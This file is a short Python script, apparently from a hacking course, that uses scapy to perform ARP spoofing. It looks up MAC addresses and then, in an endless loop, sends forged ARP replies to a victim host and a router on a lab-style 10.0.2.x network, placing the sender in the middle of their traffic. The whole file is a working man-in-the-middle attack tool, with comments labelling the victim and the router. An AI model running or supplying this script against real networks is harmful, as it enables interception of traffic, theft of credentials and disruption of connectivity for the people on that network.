#!/usr/bin/env python
import time
import sys
import scapy.all as scapy


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # this can be any mac address, other applications.
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, verbose=False, timeout=1)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(
        op=2,  # value of 2 makes it a response, 1 is request
        pdst=target_ip,  # ip of victim
        hwdst=target_mac,  # mac of victim
        psrc=spoof_ip,  # false source ip, ip of router,
    )
    scapy.send(packet, verbose=False)


sent_packets_count = 0
while True:
    spoof("10.0.2.15", "10.0.2.1")
    spoof("10.0.2.1", "10.0.2.15")
    sent_packets_count = sent_packets_count + 2
    print("\r[+] Packets sent: " + str(sent_packets_count)),
    sys.stdout.flush()
    time.sleep(2)

# print(packet.show())
# print(packet.summary())
# scapy.send(packet)
